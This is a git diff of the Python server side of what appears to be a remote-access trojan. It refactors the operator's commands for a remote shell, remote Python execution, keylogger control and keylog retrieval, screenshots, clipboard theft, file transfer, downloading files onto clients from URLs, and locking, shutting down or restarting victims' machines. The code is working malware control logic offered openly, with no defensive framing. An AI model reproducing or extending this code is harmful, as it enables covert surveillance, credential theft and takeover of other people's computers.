@@ -33,7 +33,7 @@ interface_help = """--h | See this Help Message
 --i | Open Remote Python Interpreter
 --g | Grabs a screenshot
 --u | User Info
---k (start) (stop) | Manage Keylogger
+--k (start) (stop) (status)| Manage Keylogger
 --l | Returns log from client (includes keylogs)
 --s | Transfers file to Client
 --r | Transfers file to Server
@@ -150,6 +150,10 @@ def json_dumps(data):
     return json.dumps(data).encode()
 
 
+def json_loads(data):
+    return json.loads(data.decode())
+
+
 class MultiServer(object):
 
     def __init__(self):
@@ -218,7 +222,7 @@ class MultiServer(object):
         conn.recv(1024)
         conn.send(encrypted)
 
-    def accept_connections(self):
+    def accept_connections(self, _print=True):
         """ Accepts incoming connections and agrees on a AES key using RSA"""
         while 1:
             try:
@@ -273,8 +277,9 @@ class MultiServer(object):
 
                 address = address + (client_hostname,)
                 self.all_addresses.append(address)
-                msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
-                print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
+                if _print:
+                    msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
+                    print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
                 del privateKey
                 del publicKey
 
@@ -310,20 +315,20 @@ class MultiServer(object):
             target = int(target)
         except:
             logging.error('Client index should be an integer')
-            return None, None
+            return None
         try:
             conn = self.all_connections[target]
         except IndexError:
             logging.error('Not a valid selection')
-            return None, None
+            return None
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return conn
 
     def send_file(self, conn, file_to_transfer, save_as):
         """ Send file from Server to Client """
-
+        # returns None
+        self.send(conn, json_dumps(['SEND FILE', save_as]))
         self.receive(conn, _print=False)
-        print('Transferring file...')
         for line in read_file(file_to_transfer):
             self.send(conn, line)
             self.receive(conn, _print=False)
@@ -331,10 +336,10 @@ class MultiServer(object):
         self.send(conn, b'<FILE TRANSFER DONE>')
         self.receive(conn)
 
-    def receive_file(self, conn, save_as):
+    def receive_file(self, conn, file_to_transfer, save_as):
         """ Transfer file from Client to Server """
 
-        print('Transferring file...')
+        self.send(conn, json_dumps(['RECEIVE FILE', file_to_transfer]))
         with open(save_as, 'wb') as f:
             while 1:
                 data = self.receive(conn, _print=False)
@@ -345,55 +350,206 @@ class MultiServer(object):
                 self.send(conn, b'<RECEIVED>')
         self.receive(conn)
 
-    def screenshot(self, conn):
+    def _get_log(self, conn):
+        self.send(conn, json_dumps(['LOG_FILE']))
+        return self.receive(conn, _print=False).decode()
+
+    def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))):
         """ Take screenshot on Client """
-        self.send(conn, json_dumps(['--g']))
-        data = self.receive(conn, _print=False)
-        if data == b'<ERROR>':
-            print('Error taking screenshot.')
+        # returns True/False, None/error
+        self.send(conn, json_dumps(['SCREENSHOT']))
+        data = self.receive(conn, _print=False).decode()
+        if data == '<ERROR>':
             self.send(conn, b'<RECEIVING>')
-            self.receive(conn)
-            return
-        with open('{}.png'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
-            f.write(data)
-        print('Screenshot saved.')
-        return
+            error = self.receive(conn, _print=False)
+            return False, error
+        self.receive_file(conn, data, save_as)
+        return True, None
+
+    def client_exec(self, conn, command):
+        """ Remote Python Interpreter """
+        # returns command_output/None
+        self.send(conn, json_dumps(['EXEC', command]))
+        data = json_loads(self.receive(conn, _print=False))
+        if data[1] != None:
+            return data[1]
+        if data[0] != '':
+            return data[0]
 
     def python_interpreter(self, conn):
-        """ Remote Python Interpreter """
-        self.send(conn, json_dumps(['--i']))
-        self.receive(conn, _print=False)
+        """ Remote Python Interpreter CLI"""
         print('CAUTION! Using this feature wrong can break the client until restarted.')
         print('Tip: help("modules") lists available modules')
         while 1:
             command = input('>> ')
             if command == 'exit' or command == 'exit()':
-                self.send(conn, b'<QUIT>')
-                self.receive(conn)
                 break
-            self.send(conn, command.encode())
-            data = json.loads(self.receive(conn, _print=False).decode())
-            if data[0] != '':
-                print(data[0])
-            if data[1] != None:
-                print(data[1])
+            result = self.client_exec(conn, command)
+            if not result == None:
+                print(result.rstrip("\n"))
+
+    def client_shell(self, conn, command, _print=True):
+        """ Remote Shell with Client """
+        # returns command_output, cwd
+        system = self.get_platform(conn)
+        if command.lower() == 'cd':
+            self.send(conn, json_dumps(['SHELL', command]))
+            result = self.receive(conn, _print=False)
+            if system == 'Windows':
+                result += '\n'
+            if _print:
+                print(result)
+            return result, result
+        if command[:2].lower() == 'cd' or command[:5].lower() == 'chdir':
+            self.send(conn, json_dumps(['SHELL', command]))
+            cwd = json.loads(self.receive(conn, _print=False).decode())
+            if cwd[0] == '<ERROR>':
+                if _print:
+                    print(cwd[1])
+                cwd = self.get_cwd(conn)
+                return cwd[1], cwd
+            else:
+                if _print and system == 'Windows':
+                    print()
+                return cwd[0], cwd[0]
+        self.send(conn, json_dumps(['SHELL', command]))
+        result = []
+        while 1:
+            output = self.receive(conn, _print=False)
+            if output == b'<DONE>':
+                break
+            result.append(output)
+            if _print:
+                try:
+                    print(output.decode())
+                except UnicodeDecodeError:
+                    print(output)
+            self.send(conn, json_dumps(['<LISTENING>']))
+        cwd = self.get_cwd(conn)
+        return result, cwd
+
+    def get_platform(self, conn):
+        """ Get Client Platform """
+        # platform.system()
+        self.send(conn, json_dumps(['<PLATFORM>']))
+        return self.receive(conn, _print=False).decode()
+
+    def get_cwd(self, conn):
+        """ Get Client cwd """
+        # returns cwd
+        self.send(conn, json_dumps(['<GETCWD>']))
+        return self.receive(conn, _print=False).decode()
+
+    def start_keylogger(self, conn):
+        """ Start Keylogger """
+        # returns True/False
+        self.send(conn, json_dumps(['START_KEYLOGGER']))
+        return json_loads(self.receive(conn, _print=False))[0]
+
+    def keylogger_status(self, conn):
+        """ Get Keylogger Status """
+        # returns True/False
+        self.send(conn, json_dumps(['KEYLOGGER_STATUS']))
+        return json_loads(self.receive(conn, _print=False))[0]
+
+    def stop_keylogger(self, conn):
+        """ Stop Keylogger """
+        # returns True/False
+        self.send(conn, json_dumps(['STOP_KEYLOGGER']))
+        return json_loads(self.receive(conn, _print=False))[0]
+
+    def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))):
+        """ Transfer log to Server """
+        # save_as: file name
+        log = self._get_log(conn)
+        self.receive_file(conn, log, save_as)
+        return save_as
+
+    def get_info(self, conn, _print=True):
+        self.send(conn, json_dumps(['INFO']))
+        return self.receive(conn, _print=_print)
+
+    def fill_clipboard(self, conn, data):
+        # data[0]: True/False
+        # data[1]: None/error
+        self.send(conn, json_dumps(['COPY', data]))
+        data = json_loads(self.receive(conn, _print=False))
+        return data[0], data[1]
+
+    def get_clipboard(self, conn, _print=False):
+        """ Get Client Clipboard """
+        # data[0]: True/False
+        # data[1]: clipboard/error
+        self.send(conn, json_dumps(['PASTE']))
+        data = json_loads(self.receive(conn, _print=False))
+        if _print and data[0]:
+            print(data[1])
+        return data[0], data[1]
+
+    def _get_info(self, conn):
+        """ Get Client Info """
+        
+        # info = [
+        #     platform.system()
+        #     os.path.expanduser('~')
+        #     getpass.getlogin()
+        # ]
+
+        self.send(conn, json_dumps(['<INFO>']))
+        return json_loads(self.receive(conn, _print=False))
+
+    def download(self, conn, url, file_name):
+        """ Download File To Client """
+        # returns True/False, None/error
+        self.send(conn, json_dumps(['DOWNLOAD', url, file_name]))
+        data = json_loads(self.receive(conn, _print=False))
+        return data[0], data[1]
+
+    def restart_session(self, conn):
+        """ Restart Client Session """
+        # returns True
+        self.send(conn, json_dumps(['RESTART_SESSION']))
+        self.receive(conn, _print=False)
+        self.list_connections(_print=False)
+        return True
+
+    def disconnect(self, conn):
+        """ Disconnect Client """
+        # returns True
+        self.send(conn, json_dumps(['DISCONNECT']))
+        self.receive(conn, _print=False)
+        conn.close()
+        self.list_connections(_print=False)
+        return True
+
+    def lock(self, conn):
+        """ Lock Client Machine (Windows Only) """
+        self.send(conn, json_dumps(['LOCK']))
+        return self.receive(conn, _print=False)
+    
+    def shutdown(self, conn):
+        """ Shutdown Client Machine """
+        self.send(conn, json_dumps(['SHUTDOWN']))
+        self.list_connections(_print=False)
+        return
+
+    def restart(self, conn):
+        """ Restart Client Machine """
+        self.send(conn, json_dumps(['RESTART']))
+        self.list_connections(_print=False)
+        return
 
     def shell(self, conn):
-        """ Remote Shell with Client """
-        self.send(conn, json_dumps(['<GETCWD>']))
-        cwd = self.receive(conn, _print=False).decode()
+        """ Remote Shell Interface """
+        cwd = self.get_cwd(conn)
         command = ''
-        self.send(conn, json_dumps(['<INFO>']))
-        info = json.loads(self.receive(conn, _print=False).decode())
-        system = info[0] # platform.system()
-        home = info[1] # os.path.expanduser('~')
-        login = info[2] # getpass.getlogin()
+        info = self._get_info(conn)
         hostname = self.all_addresses[self.all_connections.index(conn)][-1]
 
         while 1:
-            if not system == 'Windows':
-                cwd = cwd.replace(home, '~')
-                _input = '{0}@{1}:{2} $ '.format(login, hostname, cwd)
+            if not info[0] == 'Windows':
+                cwd = cwd.replace(info[1], '~')
+                _input = '{0}@{1}:{2} $ '.format(info[2], hostname, cwd)
             else:
                 _input = '{0}>'.format(cwd)
 
@@ -402,40 +558,7 @@ class MultiServer(object):
                 continue
             if command == 'exit':
                 break
-            if command.lower() == 'cd':
-                self.send(conn, json_dumps(['--e', command]))
-                self.receive(conn)
-                if system == 'Windows':
-                    print()
-                continue
-            if command[:2].lower() == 'cd' or command[:5].lower() == 'chdir':
-                self.send(conn, json_dumps(['--e', command]))
-                cwd = json.loads(self.receive(conn, _print=False).decode())
-                if cwd[0] == '<ERROR>':
-                    print(cwd[1])
-                    self.send(conn, json_dumps(['<GETCWD>']))
-                    cwd = self.receive(conn, _print=False).decode()
-                else:
-                    cwd = cwd[0]
-                    if system == 'Windows':
-                        print()
-                continue
-            self.send(conn, json_dumps(['--e', command]))
-            try:
-                while 1:
-                    output = self.receive(conn, _print=False)
-                    if output == b'<DONE>':
-                        break
-                    try:
-                        print(output.decode())
-                    except UnicodeDecodeError:
-                        print(output)
-                    self.send(conn, json_dumps(['<LISTENING>']))
-            except (EOFError, KeyboardInterrupt):
-                print('Keyboard Interrupt')
-                self.send(conn, b'--q')
-                break
-
+            _, cwd = self.client_shell(conn, command)
 
     def selector(self, conn, command):
         if '--b' in command:
@@ -454,89 +577,98 @@ class MultiServer(object):
             return
         if '--c' in command:
             text_to_copy = input('Text to copy: ')
-            self.send(conn, json_dumps(['--c', text_to_copy]))
-            self.receive(conn)
+            result, error= self.fill_clipboard(conn, text_to_copy)
+            if result:
+                print('Copied to Clipboard.')
+            else:
+                print(error)
             return
         if '--u' in command:
-            self.send(conn, json_dumps(['--u']))
-            info = self.all_addresses[self.all_connections.index(conn)]
-            print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
-            self.receive(conn)
+            self.get_info(conn)
             return
         if '--l' in command:
-            self.send(conn, json_dumps(['--l']))
-            self.receive_file(conn, '{}.log'.format(str(datetime.now()).replace(':','-')))
-            print('Log saved.')
+            print('Transferring log...')
+            log = self.get_log(conn)
+            print('Log saved as: {}'.format(log))
             return
         if command[:3] == '--k':
             if command[4:].strip() == 'start':
-                self.send(conn, json_dumps(['--k start']))
-                self.receive(conn)
+                if self.start_keylogger(conn):
+                    print('Started Keylogger')
+                else:
+                    print('Keylogger ImportError')
+                return
+            if command[4:].strip() == 'status':
+                if self.start_keylogger(conn):
+                    print('Keylogger Running')
+                else:
+                    print('Keylogger is not running.')
                 return
             if command[4:].strip() == 'stop':
-                self.send(conn, json_dumps(['--k stop']))
-                self.receive(conn)
+                if self.stop_keylogger(conn):
+                    print('Stopped Keylogger')
+                else:
+                    print('Keylogger ImportError')
                 return
         if '--p' in command:
-            self.send(conn, json_dumps(['--p']))
-            self.receive(conn)
+            self.get_clipboard(conn, _print=True)
             return
         if command[:3] == '--x':
             command = command[4:].strip()
             if command == '1':
-                self.send(conn, json_dumps(['--x', '1']))
-                self.receive(conn)
-                conn.close()
-                self.list_connections(_print=False)
-                return True
+                print('Restarting Session...')
+                return self.restart_session(conn)
             elif command == '2':
-                self.send(conn, json_dumps(['--x', '2']))
-                self.receive(conn)
-                conn.close()
-                self.list_connections(_print=False)
-                return True
+                print('Disconnecting Client...')
+                return self.disconnect(conn)
         if command[:3] == '--q':
             command = command[4:].strip()
             if command == '1':
-                self.send(conn, json_dumps(['--q', '1']))
-                self.receive(conn)
+                if self.lock(conn):
+                    print('Locked Client Machine')
+                else:
+                    print('Locking is only available on Windows.')
                 return
             elif command == '2':
-                self.send(conn, json_dumps(['--q', '2']))
-                print('Shutdown Client Machine.')
-                self.list_connections(_print=False)
+                print('Shutting down Client Machine')
+                self.shutdown(conn)
                 return True
             elif command == '3':
-                self.send(conn, json_dumps(['--q', '3']))
-                print('Restarted Client Machine.')
-                self.list_connections(_print=False)
+                print('Restarting Client Machine')
+                self.restart(conn)
                 return True
         if '--d' in command:
             file_url = input('File URL: ')
             file_name = input('Filename: ')
-            self.send(conn, json_dumps(['--d', file_url, file_name]))
-            self.receive(conn)
+            print('Downloading File...')
+            result, error = self.download(conn, file_url, file_name)
+            if result:
+                print('Downloaded file successfully')
+            else:
+                print(error)
             return
         if '--s' in command:
             file_to_transfer = input('File to Transfer to Client: ')
             save_as = input('Save as: ')
-            self.send(conn, json_dumps(['--s', save_as]))
+            print('Transferring file...')
             self.send_file(conn, file_to_transfer, save_as)
+            print('File transferred.')
             return
         if '--r' in command:
             file_to_transfer = input('File to Transfer to Server: ')
             save_as = input('Save as: ')
-            self.send(conn, json_dumps(['--r', file_to_transfer]))
-            self.receive_file(conn, save_as)
+            print('Transferring file')
+            self.receive_file(conn, file_to_transfer, save_as)
+            print('File transferred.')
             return
         if '--g' in command:
+            print('Taking Screenshot...')
             self.screenshot(conn)
             return
         if '--h' in command:
             print(interface_help)
             return
         print("Invalid command: '--h' for help.")
-
 
     def broadcast(self, command):
         connections = self.all_connections[:]
@@ -548,7 +680,6 @@ class MultiServer(object):
             except Exception as e:
                 print(errors(e))
 
-
     def interface(self, conn):
         """ CLI Interface to Client """
         ip = self.all_addresses[self.all_connections.index(conn)][0]
@@ -556,7 +687,6 @@ class MultiServer(object):
             command = input('{0}> '.format(ip))
             if self.selector(conn, command):
                 break
-
 
     def turtle(self):
         """ Connection Selector """
@@ -599,44 +729,21 @@ class MultiServer(object):
                 print(errors(e))
 
 
-def create_workers():
-    """ Create worker threads (will die when main exits) """
-    server = MultiServer()
-    for _ in range(NUMBER_OF_THREADS):
-        t = threading.Thread(target=work, args=(server,))
-        t.daemon = True
-        t.start()
+def accept_conns(server):
+    server.socket_create()
+    server.socket_bind()
+    server.accept_connections()
     return
 
 
-def work(server):
-    """ Do the next job in the queue (thread for handling connections, another for sending commands)
-    :param server:
-    """
-    while True:
-        x = queue.get()
-        if x == 1:
-            server.socket_create()
-            server.socket_bind()
-            server.accept_connections()
-        if x == 2:
-            server.turtle()
-        queue.task_done()
+def accept_thread(server):
+    t = threading.Thread(target=accept_conns, args=(server,))
+    t.daemon = True
+    t.start()
     return
-
-
-def create_jobs():
-    """ Each list item is a new job """
-    for x in JOB_NUMBER:
-        queue.put(x)
-    queue.join()
-    return
-
-
-def main():
-    create_workers()
-    create_jobs()
 
 
 if __name__ == '__main__':
-    main()
+    server = MultiServer()
+    accept_thread(server)
+    server.turtle()
